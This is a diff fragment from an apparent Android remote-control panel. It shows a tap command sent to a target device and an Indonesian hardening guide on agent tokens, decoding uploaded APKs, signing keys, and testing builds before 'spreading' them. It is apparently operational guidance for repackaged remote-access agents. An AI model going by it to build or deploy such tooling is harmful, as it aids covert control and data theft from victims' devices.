@@ -1,1 +1,14 @@
 {"t":"cmd","target":"targetid","type":"tap","args":{"x":300,"y":700}}
+Event server ke operator: presence, result, stream, dump, info, targets_dirty.
+## `docs/HARDENING.md`
+
+```markdown
+# Hardening
+
+1. Ganti `license_key` setelah instalasi (`/admin`).
+2. Rotasi `agent_token_secret` bila APK pernah bocor.
+3. Jalankan di belakang TLS (`caddy reverse-proxy` / `nginx`) → pakai `wss`.
+4. Batasi `max_upload_mb`; validasi APK sebelum decode.
+5. Backup `data/m4zk1play.db` + `data/keys/m4zk1play.jks` (kalau hilang, update APK tak bisa ditimpa).
+6. Jangan pakai package name yang sama dengan app target.
+7. Uji build di device sendiri dulu sebelum menyebar.
